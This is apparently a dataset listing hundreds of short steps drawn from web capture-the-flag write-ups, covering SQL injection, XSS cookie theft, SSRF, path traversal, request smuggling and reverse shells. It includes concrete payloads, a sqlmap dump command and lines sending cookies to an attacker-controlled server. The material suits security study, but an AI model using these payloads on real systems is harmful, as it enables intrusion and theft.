    "Extracted the flag from the response",
    "Overwrite the index.html file",
    "Identified that the OTP code was validated using SQL 'LIKE' operator.",
    "Use 'python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com'",
    "Include the parameter `/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js` in the request",
    "Enter the payload 'or 1=1;--' into the 'pass' field to attempt a bypass.",
    "Reflected the result into the 'user' tag of the HTML response.",
    "Identify that CSRF token is not being checked.",
    "Attempted to decode the data contents.",
    "Recognized this configuration grants access to any file on the filesystem.",
    "Find 'flag.file'",
    "Open the style.css file",
    "Submitted this payload to the meme generator",
    "Note that the number of pages is shown",
    "Checked the source code of the 'd4rks0c1ety' page",
    "Noticed 'frequency' increments with each page refresh.",
    "Received a shapefile with information about cameras in Singapore",
    "Use the navigation factor.",
    "Infer from the knowledge of SQL Injection that the username and password input can be manipulated.",
    "Decrypt the 'flag.png.encrypted' file.",
    "Change session username to 'root' using client-side cookies.",
    "Spot the 'auth.ts' file.",
    "Get arbitrary code execution.",
    "Inspect the unzipped contents of 'src.zip'.",
    "Select 'img/paperbots.svg' from the images provided by the server.",
    "Identified a column labeled 'R34L_F14G'.",
    "Copy the value of the content attribute: 'flag{1nspector_g3n3ral_at_w0rk}'",
    "Pause the script for a random interval between 1 to 4 seconds.",
    "Submit a malformed statement",
    "Identify that the app is written in TypeScript and Deno.",
    "Use the tool 'git-dumper'.",
    "Enter the username and password",
    "Read the flag.",
    "Messages and signatures were verified by the frontend.",
    "Examined the login form on 'login.php'.",
    "Recognize the challenge.",
    "Find that the Unicode character '\u00df' turns into two characters 'SS' when converting to upper case.",
    "Polluted 'data' in '__proto__.data' to load the JavaScript file.",
    "Password found: 'I4m4M4st3rC0d3rH4x0rsB3w43'",
    "Observe the name of the challenge.",
    "Use the dumped admin credentials to login to the first webpage.",
    "Read the content of the `68696e742e747874` file, which is the hex representation of hint.txt",
    "Host the 'outer.html' file",
    "Noted restrictions on space, 'AND', 'OR', etc.",
    "Observe the redirection upon successful authentication.",
    "Obtain flag.",
    "Find out that the URL capture service takes a screenshot",
    "Enter the website.",
    "Examined the 'signup.js' file",
    "Noticed that each challenge string must be found every time it is called.",
    "Download binary.",
    "Realize that it runs the function exposed by the WASM module.",
    "Open the URL in a browser",
    "Include the payload in the request.",
    "Decided to use the 'X-Forwarded-For' field to send the fake IP address.",
    "Identify the usage of exiftool",
    "Observe use of secret flag within a MD5 calculation",
    "Identified a flag table in the database.",
    "Sent the SQL query to FD 4 (MySQL server).",
    "Replace the multiple URL opens with actual browser window opens.",
    "Identify attribute that can be polluted to spawn a new process or execute a command.",
    "Accessed the site.",
    "The task of this payload is to exfiltrate the content from `http://localhost:5000/admin`",
    "Identified a potential vulnerability.",
    "Observe that the end-point returns base64-encoded result of each ping request.",
    "Noticed the feature using SQLite through filters and SQL statements",
    "Craft a malicious serialized class",
    "Output the character if it returns a count larger than 0.",
    "Bypass the login function successfully due to successful SQL injection.",
    "Checked the version numbers of these libraries and searched for security vulnerabilities without any results.",
    "Successfully change the website content from the original message to the target flag value 'csictf{h3r3_i_4m}'.",
    "Identify the Base64 encoded string.",
    "Execute a SQL query via URL manipulation",
    "Leverage `subprocess.Popen` for Remote Code Execution (RCE)",
    "Attempted to uncover stored procedures and functions using `1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`.",
    "In the 'Flask.current_app' module",
    "Looked into database.py.",
    "Analyzed given PHP script to understand the functionality of different methods.",
    "Use the 'UpdatePassword' mutation.",
    "Recognized that file path in 'export_db' function could be manipulated for path traversal.",
    "Access 'robots.txt'",
    "Create a script to modify the sessionID to valid lua.",
    "Understood that 0 compared with 'michelle' returns true",
    "Analyzed the Tomcat log found in the S3 bucket.",
    "Use the 2FA token on an authenticator application.",
    "Initialized a server to exploit the above vulnerability.",
    "Receive a full introspection response from the /graphql endpoint.",
    "Realize that Template Literals can be used to call functions without parentheses.",
    "Inspect the source code for vulnerabilities and weaknesses.",
    "Switch strategy and attempt to upload an HTML file containing a simple JavaScript function.",
    "Observe the packets used for post retrieval",
    "Spot '@login_required' annotations as indicators.",
    "Acquire the flag.",
    "Identified a Server Side Request Forgery (SSRF) vulnerability.",
    "Identified the need to change the Asymmetric Cipher Algorithm to Symmetric Cipher Algorithm.",
    "Executed a GET request `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt HTTP/1.1` to exploit this vulnerability.",
    "Identify `/cookies` endpoint",
    "Use burp tool to execute the interception.",
    "Explore the search functionality.",
    "Analyse the response of the authentication API",
    "Implemented a smart voter script.",
    "Observe the returned localhost.",
    "Submit an HTTP request with the modified cookie",
    "Error is raised later in the assignment step.",
    "Identify that the challenge is written using the mermaid library",
    "Examine the Python code.",
    "Climb the Python MRO hierarchy.",
    "Utilized the environment to assemble and debug shellcode.",
    "Noticed 'email' and 'pass' fields.",
    "Executed 'cat index.php' command.",
    "Recognize how Wildcard Injection can be abused for command injection attacks.",
    "Access the website's source code",
    "Initiate data leaking process",
    "Connected to the website",
    "Identify and retrieve the CTF flag from the page contents.",
    "Fail the authentication.",
    "Realize that removing a portion of the 'counter' cookie triggers a zlib Input Error",
    "Result: buyer's balance increases due to subtraction in 'buyFlag' function",
    "Use brute force to solve for a set of possible solutions for 'c' and 'prev_encoded_arr[0]'.",
    "Discovered that the 'users' table had 3 columns.",
    "Attempted to bypass `is_valid_email(email)` function.",
    "Identify the POST request to /add for adding notes.",
    "Identified the flag to be 'rtcp{d0n't_g1ve_us3rs_db_a((3ss}'.",
    "Log the \"CONFIG\".",
    "Discover the app at `http://whatever.domain.com/app/`.",
    "Recognize that the interface allows for creating redirect URLs, changing admin's password, and reporting URLs.",
    "Identify the input fields for the login function.",
    "Craft a payload with a special SQL statement",
    "Read and understand the requirement for three keys.",
    "Search for HTTP packets within the packet logs.",
    "Described the 'words' table using the `1'; DESCRIBE tablename;` command.",
    "Observe the form field requesting an IP address.",
    "Login using the found password.",
    "Open the 'play.php' file",
    "Used 'php://filter' to view the source of 'checkpass.php'.",
    "Exclude common words from the search.",
    "Fetch headers from /out/save.txt.",
    "Send the command `echo 'X'`.",
    "Send a request to read the content of the `flag.txt` file.",
    "Unserialize the phar file.",
    "Assign the string 'Hello_Rules' to a variable.",
    "Pull the details of the user with the proper role",
    "Notice the cookies.",
    "Observe the returned flag.",
    "Bypass the JavaScript check.",
    "Use sqlmap tool.",
    "Realize that the submitted string is appended after the '$the_cow' variable in the script.",
    "Ruled out mutation XSS attacks on these libraries as 'marked' does not sanitize output HTML.",
    "Analyze the process in the script: making a cURL request, hashing the results with MD5, and setting the 'auth' cookie to the value of 'FLAG_AUTH' from secrets",
    "Inspected the 'flag.php' file and its history",
    "Using the method 'db.generateToken(0)' to generate the token.",
    "Accessed the meme generator web application.",
    "Injected FTP commands",
    "Used format of '..://alien.somewhere.meepwn.team/../..//index.php' request.",
    "Set the 'X-Forwarded-For' header to '192.168.3.16'.",
    "Noted the title 'advertisement'.",
    "Identify unrelated packets such as 'pings'.",
    "Realize that using string interpolation instead of object properties can lead to code injection vulnerabilities.",
    "Open a web browser.",
    "Injected payload for basic XSS execution with DOM Clobbering",
    "Indicate that the exploitation of an XXE vulnerability was successful.",
    "Analyzed the source code of the web application",
    "Abused strange behaviors of `<math>` elements.",
    "Identify that the JavaScript check prevents submission of long passwords.",
    "Attempt to login using 'user' as both username and password.",
    "Identify that the program attempts to validate IP addresses.",
    "Retrieve the flag using the customized request.",
    "Identified privileged permissions to create AWS Lambda functions",
    "Identify the 'GopherAdapter' code in 'modules/Gophers.py'.",
    "Payload 2: Obtained the page contents.",
    "Receive an error indicating 'triton' as an available rocket name.",
    "Use a basic SQL injection payload",
    "Impersonate an admin.",
    "Viewed the backend infrastructure.",
    "Close the string and insert arbitrary JavaScript",
    "Pass the 'username' value as ','\"member\":\"1' to the function in order to change the value of 'member' to 1.",
    "Find the flag inside the environment file.",
    "Identify when this function is called.",
    "Examined the Python script used for the attack.",
    "Identified the next `malloc()` call in `insertSorted()` where the overwrite can happen.",
    "Visit the website.",
    "Payload used: admin@uupeye.edu' or '1'='1",
    "Define conditional statement",
    "Determined the solution for the crossword puzzle.",
    "Observe that every object now has the `offline` attribute.",
    "Retrieve required strings for password.",
    "Include var1 and var2 parameters in the request.",
    "Create PHP payload",
    "Use the server's own mechanism against it.",
    "Utilized DOM clobbering.",
    "Included the 'Transfer-Encoding' header in the payload.",
    "Connect to the website 138.247.13.115.",
    "Analyze the JavaScript bundle to understand how the hash is calculated.",
    "Perform XSS attack.",
    "Understand that script tags can be bypassed using 'onload' event handlers",
    "Viewed page source.",
    "Converted the hexadecimal values into binary data.",
    "Find the /login/ endpoint using dirsearch.",
    "Identify the '/admin' directive in the Nginx configuration that denies all requests",
    "Locate the style.css file within the website files",
    "Connect to the challenge website",
    "Placed a second dummy 'GET / HTTP/1.1' request.",
    "Analyse the HTML code.",
    "Recognized the presence of admin's 'Cookie' and 'X-Access' headers.",
    "Write a LaTeX script.",
    "Caused problems.",
    "Send the crafted payload",
    "Trigger an error.",
    "Notice that ws.origin corresponds to the Origin request header.",
    "Included a calculation statement in the request.",
    "Realize that the exploit page's origin must start with 'http://localhost'.",
    "Passed the earlier jwt token as parameter",
    "Send an XSS with the stolen identifier",
    "You can run this script anywhere that is internet accessible, port forward port '16361' or deploy on Google Cloud. But, the easiest method is to use ngrok.",
    "Make another GET request to obtain the signing certificate from the platform.",
    "Append each character to an initial flag string.",
    "Realize that the `file://` protocol was not banned, allowing the encryption.",
    "Discover the security question answer from one of the images.",
    "Prepare a GET request to the URL 'http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg'.",
    "Analyzing the behavior of the website led to a suspicion that the web application might be vulnerable to SQL injection.",
    "Find the file js.main.",
    "Enter 'Science' for Favorite Primary School Subject",
    "Understand that each record consists of 20 blocks of 512 bytes each.",
    "Scan 10.35.2.134/call_api.php.",
    "Initiate Remote Code Execution (RCE) through the crafted request.",
    "Recognize that the 'Markdown' converter uses regex.",
    "Formed a hypothesis.",
    "Note that it executes file_get_contents('../flag.txt')",
    "Identify that Meteor is being used.",
    "Attempt different passwords",
    "Run SQLMap command 'sqlmap http://127.0.0.1/test.php?search=abc -p search --tamper=space2comment --technique=B --risk 3 --dump --threads 10 -D db -T internal_api_infos' to inject and dump database data.",
    "Break the script if no character is causing a change in content length",
    "Utilize the specified attributes to redirect.",
    "Noted that the site does not require proof of domain ownership.",
    "Ensured the crafted session cookie matches the expected format used by the application",
    "Confirmed that the exploit worked.",
    "Observe the authentication response for an existing user with the wrong password",
    "Used the gained information about the 'users' table structure to craft a new SQL injection.",
    "Modify the HTTP GET parameter",
    "The payload is sent to the target URL via POST request.",
    "Note that Flask's built-in server can be susceptible to HTTP request smuggling attacks due to its insecure nature",
    "Note that you need the secret key due to Flask's hash based on session data, timestamp, and the secret key.",
    "Input 'Accept-Language: ....//....//....//....//flag' in the HTTP header.",
    "Discovered that CSS attribute selectors can be used for exfiltration.",
    "Successfully restore the source code files on local machine.",
    "Access the requirements.txt file",
    "Used Python's format function",
    "Identify potentially connectable hosts.",
    "Retrieved the flag 'CSR{sometimes_it's_really_hard_to_create_good_flags}'.",
    "Parsed the shapefile using geopandas",
    "Observe that 'admin' is replaced in the username field.",
    "Exploit the vulnerability in the 'query_login_attempt' function.",
    "Leverage X-Accel-Redirect.",
    "Enable the 'debug' option",
    "Analyze the challenge description for hints.",
    "Review the problem statement.",
    "Navigate to the '/adminNames' route.",
    "Identify the need to steal the saved note",
    "Decoded the JWT token.",
    "Realized that direct exploitation of SSRF is not possible.",
    "The `run` bash script gives a reverse shell.",
    "Inspect the response better.",
    "Identified the 'login' cookie.",
    "Assign the document's cookie to the query parameter of a specified URL.",
    "Understood that the echoed input is sent to the `shellme()` function with a character limit of 1000.",
    "Append payload to '/readflag' command in 'f' GET parameter.",
    "Decide to pollute 'process.argv[2]' with a command injection payload.",
    "Send second GET request with 65534 empty spaces.",
    "Review the server code.",
    "Understood the strategy of executing multiple times until the index is 0.",
    "Identify JavaScript functions that handle creation of iframe or appending script source.",
    "Find the endpoint.",
    "Verified the shellcode's functionality and ensured compatibility with the `strlen()` function within 'shellme()' in the `shellme.so` file.",
    "Open web browser.",
    "Complete the CTF.",
    "Understood that the function decodes a user's cookie",
    "Echo back the flag.",
    "Retrieved the flag 'CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}'.",
    "Indicate another possible server.",
    "Execute ffuf to fuzz the challenge site.",
    "Create a local repository.",
    "Enter the username 'admin'",
    "Identify the id of the newly created user from the received user list.",
    "Minimized time spent on creating strings to match the server's challenge.",
    "Build the path to the flag.",
    "Construct a payload to do a redis.call() to set the serialized object with the sessionID.",
    "Obtained the admin's token.",
    "Discover that instead of 'gopher://' protocol, 'inctf://' should be used.",
    "Crafted a malicious HTTP request.",
    "Find that Vitepress running in dev mode enables CORS.",
    "Discovered a known issue in 'nunjucks' related to single line payload.",
    "Determine the command length limit of 15 characters from the code.",
    "Analyzed server-side JavaScript handling requests to '/api/true-answer'.",
    "Identified it's a Web category challenge.",
    "Set the 'language' parameter to 'key' in the JWT token.",
    "Identified the presence of SQL object within User Class.",
    "Consider whether this could present an entry point if a vulnerability, such as Template Injection, can be exploited successfully.",
    "Identified that the user agent is `wkhtmltoimage`",
    "Send the request to the server",
    "Access the webpage after the redirection.",
    "Copy the output",
    "Include '/tmp/pwn.php' using LFI.",
    "Decode the base64 string.",
    "Created a test JavaScript file",
    "Identified an additional control which blocks SQL injection if password contains the number '1'.",
    "Increase the number of commas in the input to three.",
    "Identify that 6 parameters are read from the server response",
    "The URL is fetched for the second time once it's deemed legitimate.",
    "Unzip 'src.zip'.",
    "Write a new PHP exploit",
    "Make the second GET request: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter?oauth_token=<oauth token>&oauth_verifier=<oauth verifier>'.",
    "Understand the purpose of '$regex'.",
    "Conduct an analysis on the resulting PNG file.",
    "Discovered various other important details in other schemas.",
    "Identified that 'ctx.state.user' equals to the 'username' cookie",
    "Decode the JWT at jwt.io.",
    "Have knowledge of a simple Web server written in Python",
    "Noted the purpose of the oracle in determining flag correctness.",
    "Checked the filter page for clues or information",
    "Accessed a users.php page.",
    "Analyze the encoded string",
    "Acquire the flag upon login.",
    "Inject similar code into the input box",
    "Get files from the dump.",
    "Login as admin using SQL injection",
    "Read the message in the JSON response.",
    "Executed an HTTP request using the constructed base.",
    "Ensure understanding of the code.",
    "Found that the user check 'is_admin()' would proceed to handle the 'c2' admin command parameter if true, otherwise would call 'redirect()'.",
    "Recognize the parameters as 'author', 'hidden', 'id', 'postDate', 'text', 'title'",
    "Sent a request to update the password via XHR.",
    "Identify serialization in the __destruct method.",
    "Retrieve all logs for further analysis.",
    "Check if no character in the alphabet is causing a change in content length",
    "Discovered a column named 'whatsthis'.",
    "Expect to receive the flag as a result of the successful injection.",
    "Realized that the setting name is user-controlled",
    "Note that the server filters the character '.'.",
    "Identify the JavaScript event in the onclick attribute",
    "Print the reversed string",
    "Finalized the solution.",
    "Identified the possibility of 'inserting' and overwriting the XSS payload in the `HEAD->name`.",
    "Determine successful exploitation of an XXE vulnerability",
    "Identify a vulnerability in the form.",
    "Check if PNG was found in the response.",
    "Search the challenge description online",
    "Attempted to exploit the log4j vulnerability using the 'ProfileServlet.java'.",
    "Used the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump'.",
    "Understand that 'notes.count' applies a filter.",
    "Flag was located within the public news_article table of the database dump.",
    "The data content for the request is constructed dynamically with a key-value pair.",
    "Receive a note ID.",
    "Review the AWS WAF documentation.",
    "Added more semesters to the json file",
    "Noticed that wildcards are allowed at the _end_ of the email due to `'re.match'` behavior.",
    "Recognize that the 'username' has been rot13 encoded in the decoded JWT.",
    "Set the log_file of the 'access_log' object to '../flag'",
    "Knew that the flag was located in /var/www.",
    "Using Accessibility Tool",
    "Notice that DOMPurify is applied on HTML.",
    "Analyze the 'changelog.js' script.",
    "Use the acquired financial resources to purchase the flag",
    "Separate user accounts were used.",
    "Invoke the 'render_template_string' function using the SMS message",
    "Considered the hint provided into the <flag> element talking about a '/flag' file.",
    "Updated the '$url' attribute in the serialized object.",
    "Test the character '_'",
    "Send the document cookies to an attacker-controlled server.",
    "Include a statement to match the initial UUID sequence.",
    "Researched the trivia answer 'Fear the Old Blood'",
    "Understand successful modification of the list.",
    "Decode the 2FA token received from the previous step.",
    "Used the GUID to retrieve the content.",
    "URL-encoded the payload.",
    "Receive a response from the server.",
    "Understand that the `SQL` class performs SQL queries and considers the results for authentication.",
    "Used 'shell' as the setting name in the POST request",
    "Develop the XSS payload using <img src='x' onerror='PAYLOAD'>.",
    "Identify that the login site is vulnerable to SQL injection",
    "Consider the downside of the above PoC - the potential strain on the server due to very long URLs",
    "Observe that the submission is accepted.",
    "Revealed the requirement of a 'vim' command.",
    "Observed the entry in the log file containing the cookies and value of 'X-Access' header.",
    "Craft a new session cookie with the `very_auth` variable set to 'admin'.",
    "Face a password prompt.",
    "Understand the concept of $$ variable in PHP",
    "Get the cookie's value.",
    "Execute commands using the SSTI vulnerability to read directory contents.",
    "Guessed the first part of the flag referred to in the PDF.",
    "Used SQL injection payload `1' or '1'='1`.",
    "Identify the second Javascript file responsible for sending the XML envelope and reading the answer.",
    "Use the tamper script with SQLMap.",
    "Identified the Content-Type of the XSL document as 'text/xsl'.",
    "Identified that 'redirect()' function did not actually terminate the script, but printed HTML output, allowing further code execution.",
    "Reveal the structure of the site",
    "Experiment with different values in the SQL injection payload",
    "Intend to use the crafted payload as the filename of the uploaded gif file.",
    "Managed to control $whoareyou variable.",
    "Access the website home page.",
    "Identify that the request was double proxied with Nginx.",
    "Enter the website URL in Dirb",
    "Send a request to '/pleb.127.0.0.1.nip.io'.",
    "Explain the syntax and usage of the IF function.",
    "Realized that the 'name' key value pair is required",
    "Start the decoding process by reversing the function: encoded_arr.split('').map( x => key.indexOf(x) ).reverse().",
    "Used PORT ftp command",
    "Recognize rearrangement as 'P4s5_w0Rd'.",
    "Conclude that the problem might have been misconfigured.",
    "Recognize Java Serialization notation at the start of the base64 decoded string",
    "Exclude the existing private key from the payload.",
    "Understand that if the expected value does match.",
    "Encode the script into base64.",
    "Conducted research on 'md-to-pdf'.",
    "Create the expected solution string using object injection.",
    "Note the output shown upon submitting an article",
    "Submit the file for identification.",
    "Created another payload.",
    "Note the introduced code problem.",
    "Include the caught admin cookies in the request",
    "Identified a post made by admin with the flag.",
    "Noticing the main class, Database, which creates, retrieves and generates tokens for notes.",
    "Successfully bypassed login and accessed the admin portal",
    "Acknowledge the implementation of extra checks",
    "Identify that the challenge consists of 3 services - Traefik (a HTTP proxy)",
    "Attempt to inject code with an embedded script",
    "Craft a '?cat=random\"onerror=\"alert`` img' request.",
    "Understand the usage of 'localhost:3000/render?url=' feature",
    "Checked server responses to identify Apache server version (2.4.49).",
    "Download the provided 'src.zip' file from the challenge description.",
    "Monitor the websockets traffic",
    "Examine the buy endpoint.",
    "Noted that the single request contains the admin's headers.",
    "Open the inspection tools in the web browser",
    "Connect to the website 'https://138.247.13.115.xip.io/'.",
    "Access '/admin'.",
    "Identify that the JWT expiry was not extended for failed solving attempts.",
    "Execute a Python script.",
    "Recognise potential exploit",
    "Observe functionalities for login/register, edit profile, and support",
    "Used the public key as a secret for the HMAC token.",
    "Identified vulnerability CVE-2018-8004.",
    "Received a PDF file from the '/circle/one/' endpoint.",
    "Wrote the received response to the intended output.",
    "Successfully obtain the flag.",
    "Consider the possibility of redirection during the delay.",
    "Extracted the flag.",
    "Recognize that 'mobile-viewer' couldn't directly interact with server.",
    "Test inputting content in BBCode format",
    "Access the website 'http://filereader.darkarmy.xyz/'",
    "Construct a parameter that meets the conditions and requests the flag file",
    "Verify that the flag file is present in the checkout version of the repository.",
    "Utilized SHATTERED tool.",
    "Identify that the '$hash' and the '$target' are matched using '==' instead of '==='.",
    "Crafted the SQL injection to directly pass 'flagman69' as the value for the username column using the 'UNION' clause.",
    "Pass payload as parameter",
    "Include the stolen 2FA codes in the request.",
    "Discover that the site restricts images to the same origin.",
    "Create 'collision2.pdf' with the predetermined prefix.",
    "Identify that 'flag.txt' can be read.",
    "Use Burp Suite to pass the password despite the character limit",
    "Observe that global scope is the window object in HTML.",
    "Discover that the script can be bypassed by disabling JavaScript.",
    "Visited the website 'https://chall1.jsapi.tech'.",
    "Check the response for the text 'No such person'.",
    "Analyze the browser cookies.",
    "Conclude that an image is necessary to exploit the service.",
    "Used the knowledge of the vulnerability to conclude that the web application potentially parses the HTML content and interpret it",
    "Investigate if injecting a NULL byte can bypass the 'ereg' instruction.",
    "Confirm that the password length is `22`",
    "Used the same request to read the flag from the '/readflag' binary.",
    "Visit the company website for the CTF challenge",
    "Access the subclass information",
    "Decode the ROT13 encrypted message in the HTTP response.",
    "Observed output similar to standard Linux commands.",
    "Exploited the SQL Injection protection bypass.",
    "Click the submit button",
    "Incorporated the PHP 'disable_functions' bypass exploit.",
    "The author sets a condition to set the parameters based on the specific challenge.",
    "Edit the user's own name",
    "Logged into the authentication form successfully, but noticed the flag didn't print.",
    "Test the vulnerability using the crafted payload",
    "If the character matches 5, set the LIMIT to 1",
    "Extract the flag from the HTML content of the response",
    "Created 'foo.txt' file within the 'ctf-bzr' directory.",
    "Read the HTML source code.",
    "Note that the Flask server allows duplicate 'Content-Length' headers",
    "Encode the payload in base64.",
    "Find that the content is retrieved from the URL in base64 format.",
    "Use the generated 2FA code for another CSRF attack.",
    "Realized application is running Flask with MySQL.",
    "If the text is not found, the guess was correct.",
    "Observe the configuration file of the Traefik service",
    "Found out the intended solution involves bypassing the cache partitioning.",
    "Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'.",
    "Use 'Host: app@ATTACKER_URL' to bypass the validation",
    "Inspect the provided instance of the website.",
    "Realize that HTML files don't execute on the server side.",
    "Run script.",
    "Realize that the flag can be attained with more than 1000 CAPTCHA solves.",
    "Base64 encode an XMLHttpRequest.",
    "Perform login.",
    "Logged in using the newly created admin account.",
    "Enable CORS to execute arbitrary JavaScript through the hosted file.",
    "Exploited the issue in urllib.parse.urljoin.",
    "Identify the encoded public key in the JWT.",
    "If a guess was not successful, the full password has been guessed.",
    "Identified two actions 'an excerpt' and 'read online' on the website.",
    "Update the timestamp in the POST request.",
    "Reviewed the source code.",
    "Import 'io/ioutil'.",
    "Display the content of 'flag.txt' remotely using the identified class",
    "Examine the interface of the website.",
    "Access /private.php.",
    "Share the password.",
    "Notice that one gallery is set to private.",
    "Recognize the existence of the 'new chat' feature",
    "Download the .DS_Store file.",
    "Host a custom script as 'assets/js/bootstrap.js' on the attacker-controlled site.",
    "Read binary '/readflag'.",
    "Discover that all other endpoints are protected by authenticationMiddleware.",
    "Included 'GET /flag HTTP/1.1' in the request body.",
    "Use Fetch API on 'mobile-viewer' page.",
    "Consider redefining the Object prototype if it's necessary.",
    "Specify the URL http://35.207.120.163.",
    "Made a GET request with the payload.",
    "Avoided CORS issues.",
    "Observe within the content of the page.",
    "Implement '__defineSetter__' on 'converters'.",
    "Notice a redirection with 302 Found to /index.php.",
    "Prepared my server for listening with netcat",
    "If the check is successful, it indicates that the payload was able to pass through SQL Injection.",
    "Introduced NOP Sled to efficiently manage oversized jumps.",
    "Prepared an XML payload.",
    "Identified the challenge as an XPATH injection challenge.",
    "Notice that the site prepends a backslash to escape the single quote.",
    "Receive a pending request response.",
    "Failed at multiple attempts to get reverse shell.",
    "Attempted '127.0.0.1;ls .' in the URL.",
    "Report the HTML file link to trick admin into opening it.",
    "Determine from the result that the site uses SQLite as its database.",
    "Note that they appear unusual.",
    "Run the PHP shell",
    "Understand that the goal is to exfiltrate the session cookies",
    "Retrieve the flag from the server.",
    "Locate the 'User-Agent' header in the HTTP request.",
    "Modify the RCE to trigger a reverse shell.",
    "Clarified that the 'shell_exec' function executes a command in a shell and returns the output.",
    "Understood that data is packed in 'username:password:admin' format.",
    "Create a function 'get_passwords' that generates all possible combinations of YYYYMM from the years 1900 to 2019 and months from 1 to 13.",
    "Identify that output content being checked for the presence of the string 'zer0pts', and devise a method to bypass it.",
    "Observe that the contents of 'secret' tags are replaced with 'Protected'.",
    "Identify interesting functionality of the app.",
    "Send POST request to server",
    "Observe the error message.",
    "Data is POST-ed to the /api/filter endpoint",
    "Submit a URL to the '/share' endpoint.",
    "Review the source code in `database.sql` file again.",
    "Use '' OR 1=1;#' as password for SQL injection",
    "Investigate the behaviour of appending different strings after the '/pleb' directory in the site URL.",
    "Understand that '../' is replaced in the code.",
    "Set 'shell=true' for all objects",
    "Modify the SQL injection query",
    "Get a reverse shell on the Python microservice",
    "Used distinct virtual hosts and shell wildcards for the same result.",
    "Observe that the website serves an 'index.html' file",
    "Use it to SSH onto the target server.",
    "Different intended solution using 'PerformanceLongTaskTiming API'.",
    "Confirm that the login page does not contain any JavaScript code.",
    "Discover that the web app is running in debug mode.",
    "Understand that by adding the necessary characters to the 'username', it is possible to close the double-quote and manipulate the fields following it in the token.",
    "Realize the challenge of reaching the Python microservice while the Traefik proxy only allows the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Submit the crafted request to the server.",
    "Identify that an attacker has set up a keylogger.",
    "Identify that the form only allows the uploading of PDF and DOCX files",
    "Encode the session.",
    "Understand that the 'demo()' function is called on the 'demo' GET request parameter.",
    "Check the profile of each accessed account",
    "Use the encoded payload to bypass the WAF 'Skynet'.",
    "Used the formula to calculate the great-circle distance between locations",
    "Identify the AES ECB key for decoding the Bitcoin Wallet password.",
    "Trim a section of the server response using slicing.",
    "Used the profile picture upload feature",
    "Generate a URL-encoded string.",
    "Visit the challenge URL",
    "Access the website",
    "Realize it's unlikely they want me to find a vulnerability in DOMPurify.",
    "Access the '/admin' page",
    "Examine the source code.",
    "Download the 'dirstate' file from the target server.",
    "Check the cookies of the webpage",
    "Retrieve the list of files in the directory",
    "Attempt to concatenate large integers in SQLite.",
    "Examined 'auth.py'.",
    "Use the crafted cookie value",
    "Used '${IFS}' to get around the regex match restriction.",
    "Identify the need to perform an XSS attack.",
    "The process includes sending the POST request, extracting the cookie, and getting the flag",
    "Using the command: python3 -m flask run",
    "Page contains some HTML and JavaScript.",
    "Implemented the newly crafted SQL injection on the authentication form.",
    "Review the second error received.",
    "Note the possibility of command injection in the 'execSync' call.",
    "Deduced the number of columns based on error return.",
    "Identified the required user-agent according to the code.",
    "Evaluated the PHP code to understand how user input is processed.",
    "This solution works for the 'Gate Keeper' challenge as well.",
    "Revealed the flag.",
    "Used `1'; SHOW DATABASES;`.",
    "Find a 'secret' cookie.",
    "Use the encoded filenames as parameter values for `getimg.php` to test the LFI vulnerability.",
    "Retrieve the flag successfully.",
    "Pass the malicious note_id from the previous step",
    "Obtain the flag from the webpage which reads: MCA{sms_2fa_is_bad_also}",
    "Create a paste",
    "Discovered the full flag one character at a time",
    "Execute the exploit to retrieve the flag ('flag{npm_devs_are_pretty_bad_at_fixing_bugs}').",
    "Use this behaviour when constructing SQL queries to bypass the login.",
    "Identify that the application is vulnerable to XXE.",
    "Injected '\\debug\\answer' as the host in a curl request.",
    "Notice the particular cookie",
    "Acknowledge that the bypass involves forcing a 'null' origin",
    "Read the flag using the '< ../flag.txt' command.",
    "Created the GET request: 'GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1 Host: 138.68.228.12 Connection: close'.",
    "Find the file named configs.zip on the webpage.",
    "Identify the presence of a 'flag_is_here' directory",
    "Understand that the signature is checked server-side to prevent tampering.",
    "The process is repeated until the end of the flag is found.",
    "Indicated the attack has worked.",
    "Observe the site providing a link to the running instance.",
    "Generate and test the payload",
    "Identified the addition of note contents to the 'data-last' attribute of the '#note-text-area' element.",
    "Send a POST request to the server.",
    "Read the blog post on the home page",
    "Observe the error response from the web application.",
    "Verified that Angular parses the URL created from 'PROTOCOL + HOST + PATH'.",
    "Recalled an instance from a known website (crunchyroll.com).",
    "Perform internet searches concerning Alan Turing's life",
    "The action of setting 'shell=true' made the command run within a shell",
    "Utilized the earlier-found mutation to leak cookies to the server.",
    "Notice the website contains only a login form that might be vulnerable to SQL injection",
    "Specify the number range to be checked.",
    "Intercept the login request with 'Burpsuite'.",
    "Steal the identifier from the pop-up",
    "Discover a conditional statement in the source code",
    "Hijack the $whoareyou variable.",
    "Locate the private key",
    "Understood the potential of an 'HTTP Desync Attack' CL.TE scenario.",
    "Discovered a CVE for 'md-to-pdf'.",
    "Check the robots.txt on the site.",
    "Payload posts a message to trigger the /api/filter POST request in the admin's context",
    "Entered the parameter '?source=1' in the HTTP request.",
    "Find that content of the note is reflected in the source code",
    "Note that we can leave a comment on this page.",
    "Constructed a POST request to the '/flag' endpoint",
    "Access the website.",
    "Infer that the flag is inside a `flag.txt`",
    "Accessed the given website.",
    "Visualize the data structure using the graphql voyager tool.",
    "Control the number of intervals in the aforementioned steps to aid in the narrowing down process.",
    "Realize that a user can be registered",
    "Received a webpage from '/com/seaerch/' endpoint.",
    "Bypass the regex using the provided loophole.",
    "Replace the RANDOM placeholder in the URL with something random.",
    "Send an XSS to the pop-up",
    "Understand the functionality of the `/new` endpoint.",
    "Receive a note PW.",
    "Submit a CSS selector for a potential starting letter of the password",
    "The render2.asm file contains a hash table of commands used by the templating engine",
    "Notice that the webpage is a 'Markdown' converter.",
    "Read index.html.",
    "Observe the presence of the blacklist filter in the code.",
    "Notice a graphql endpoint.",
    "Generate URLs that set cookies with parts of manipulated JavaScript code.",
    "Obtained the flag in the response of the smuggled request.",
